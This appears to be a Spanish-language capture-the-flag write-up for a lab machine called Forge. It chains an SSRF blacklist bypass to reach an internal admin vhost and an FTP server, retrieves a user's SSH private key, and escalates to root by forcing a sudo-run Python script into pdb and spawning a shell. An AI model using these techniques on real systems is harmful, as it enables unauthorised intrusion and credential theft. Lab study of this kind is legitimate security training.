---
layout: default
title: Forge
---
# Forge

## Enumeración

Empezamos con un ping para ver si tenemos conexión con la máquina.

```bash
$ ping -c1 10.129.216.136
PING 10.129.216.136 (10.129.216.136) 56(84) bytes of data.
64 bytes from 10.129.216.136: icmp_seq=1 ttl=63 time=86.4 ms

--- 10.129.216.136 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 86.417/86.417/86.417/0.000 ms
```

Continuamos con un escaneo de puertos con **nmap**:

```bash
$ nmap 10.129.216.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-20 12:17 CDT
Nmap scan report for 10.129.216.136
Host is up (0.087s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http

Nmap done: 1 IP address (1 host up) scanned in 2.59 seconds
```

Ahora hacemos un segundo escaneo para intentar sacar las versiones de los puertos abiertos:

```bash
$ nmap 10.129.216.136 -p21,22,80 -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-20 12:19 CDT
Nmap scan report for 10.129.216.136
Host is up (0.086s latency).

PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds
```

Como vemos en la información que nos da el escaneo sobre el puerto 80, redirige a **forge.htb**, por lo que debemos agregar la entrada al archivo **/etc/hosts**.

```bash
$ echo '10.129.216.136 forge.htb' | sudo tee -a /etc/hosts
```

## Explotación

Ahora, podemos navegar a la página web a ver qué encontramos.

![forge]({{ "/assets/images/forge1.png"}})

Vemos que en la parte superior a la derecha tenemos un **Upload an image** que nos redirige al directorio **upload**, en el cual encontramos una función de subir archivos de nuestra máquina local y archivos a través de una URL:

![forge]({{ "/assets/images/forge2.png"}})

Vamos a poner una URL y capturar la petición, intentaremos buscar una SSRF, quizás podemos acceder a recursos internos, empezaremos intentando acceder a archivos en la interfaz de red local del servidor.

![forge]({{ "/assets/images/forge3.png"}})

Al parecer, si ponemos que queremos subir el archivo de la URL **http://localhost** el servidor nos responde que la URL contiene direcciones que están en la lista negra, no obstante, quizás podemos eludir la lista negra con el uso de mayúsculas:

![forge]({{ "/assets/images/forge4.png"}})

Al parecer, podemos eludirlo, eso hace que podamos acceder a recursos internos y estar frente a una SSRF.

No obstante, de momento no sabemos bien qué sacar, así que seguimos enumerando, en este caso, enumeraremos VHOSTS.

```bash
$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:SHADOW -u http://forge.htb -H "Host: SHADOW.forge.htb" -fw 18

<SNIP>

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2, Duration: 429ms]
```

Encontramos el vhost **admin**, cuyo FQDN sería **admin.forge.htb**, tenemos que añadir esa entrada al archivo **/etc/hosts** para poder acceder al mismo.

Una vez añadido, podemos acceder desde el navegador, pero este nos dirá que solo es accesible desde **localhost**.

![forge]({{ "/assets/images/forge5.png"}})

Podemos intentar acceder al vhost **admin** a través de la vulnerabilidad SSRF, usando mayúsculas para eludir la lista negra:

![forge]({{ "/assets/images/forge6.png"}})

Podemos ver, cómo se ha subido el archivo ubicado en **admin.forge.htb** y podemos verlo si hacemos una petición a la ruta generada por el servidor:

![forge]({{ "/assets/images/forge7.png"}})

Podemos ver, que tenemos acceso al vhost de administración que solo se puede acceder desde localhost, bien, si vemos el código fuente, vemos cómo estamos en un portal de administradores, lo cual quiere decir que es probable que tengamos acceso a funciones especiales o de prueba, e incluso información confidencial, vemos que tenemos 2 directorios, **/announcements** y **/upload**, pues subiremos ambos igual que hicimos con este mediante la SSRF:

![forge]({{ "/assets/images/forge8.png"}})

Una vez subidos, navegando a ellos, podemos ver cómo en **/announcements** encontramos información confidencial cómo que sabemos que la función **upload** del vhost permite subir archivos mediante ftp, ftps, http y https, además, tenemos credenciales de un servidor ftp, el cual en el escaneo de nmap pudimos ver que estaba filtrado el puerto. También podemos ver, que permite el parámetro **?u=<url>** en la URL para especificar el protocolo y servidor del cual sacar la información, cómo sabemos credenciales del servidor ftp y no podemos acceder desde nuestra máquina ya que el firewall tiene filtrado el puerto, podemos aprovechar la vulnerabilidad **redirección abierta** en la SSRF inicial de esta forma, logueandonos en el servidor ftp con las credenciales proporcionadas:

![forge]({{ "/assets/images/forge9.png"}})

Tras hacer esta petición, logueandonos en el servidor ftp aprovechando el parametro **?u** del vhost mediante la SSRF, podemos navegar al archivo en la web a ver qué nos encontramos:

![forge]({{ "/assets/images/forge10.png"}})

Podemos ver que vemos los archivos **user.txt** y el directorio **snap**, teniendo en cuenta que aquí está la flag del usuario, podemos pensar que estamos en el Home del usuario **user**, podemos intentar sacar la clave privada para loguearnos vía ssh:

![forge]({{ "/assets/images/forge11.png"}})

![forge]({{ "/assets/images/forge12.png"}})

Cómo podemos ver, tenemos la clave privada para conectarnos vía ssh, vamos a copiarla a un archivo, asignarle los permisos 600 y a intentar loguearnos vía ssh:

```bash
$ chmod 600 id_rsa
```

```bash
$ ssh -i id_rsa user@forge.htb

<SNIP>

user@forge:~$ whoami
user
```

Cómo podemos ver, estamos logueados, y en el mismo directorio de nuestro usuario, tenemos la flag del usuario:

```bash
user@forge:~$ ls -l user.txt
-rw-r----- 1 root user 33 Jul 20 17:13 user.txt
```

## Escalada de privilegios

Ahora tenemos que escalar privilegios, podemos empezar listando los permisos que tenemos como sudo:

```bash
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Tenemos ejecución de un script de python como usuario root sin proporcionar contraseña, bien, leamos qué hace el script **/opt/remote-manage.py**:

```bash
user@forge:~$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

Estamos ante un script de python que pone en escucha un puerto por la interfaz local y este espera una contraseña, que es **secretadminpassword**, si le mandas esa contraseña te desplega un menú con 4 opciones, pero no nos interesa ninguna en este caso.

Para escalar, necesitaremos abrir una segunda conexión ssh.

```bash
user@forge:~$ sudo python3 /opt/remote-manage.py
Listening on localhost:53262
```

Una vez ejecutado el script y que sepamos que puerto está a la escucha, podemos desde la otra conexión ssh, mandar la contraseña que pide, en vez de conectarnos, lo que nos dará acceso a un **pdb** (Python Debugguer), el cual interpreta comandos de python y gracias a este, que está corriendo como usuario root, podemos generarnos una shell como usuario root, mandarnos una reverse shell, etc.

```bash
user@forge:~$ echo 'secretadminpassword' > /dev/tcp/127.1/53262
```

Una vez mandado, si nos vamos a la conexión ssh en la que estábamos corriendo el script, vemos los siguiente:

```bash
user@forge:~$ sudo python3 /opt/remote-manage.py
Listening on localhost:53262
[Errno 32] Broken pipe
> /opt/remote-manage.py(20)<module>()
-> clientsock.send(b'Welcome admin!\n')
(Pdb) 
```

Tenemos Pdb, con lo que podemos generarnos una shell como usuario root, ya que el script lo ejecutamos con **sudo**.

```bash
(Pdb) import pty;pty.spawn("/bin/bash")
root@forge:/home/user# whoami
root
```

Podemos usar el módulo **pty** para generarnos una bash como cuando queremos obtener una shell más interactiva, o bien usar módulos como **os, system**, etc.

Ahora que somos usuario root, podemos leer la flag que se encuentra en **/root**:

```bash
root@forge:/home/user# cd && ls -l
total 12
-rwxr-xr-x 1 root root   46 May 28  2021 clean-uploads.sh
-rw------- 1 root root   33 Jul 20 17:13 root.txt
drwxr-xr-x 3 root root 4096 May 19  2021 snap
```

## **Keep hacking!**

<iframe width="100%" height="400" src="https://www.youtube.com/embed/J6uN-JoV1dA" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
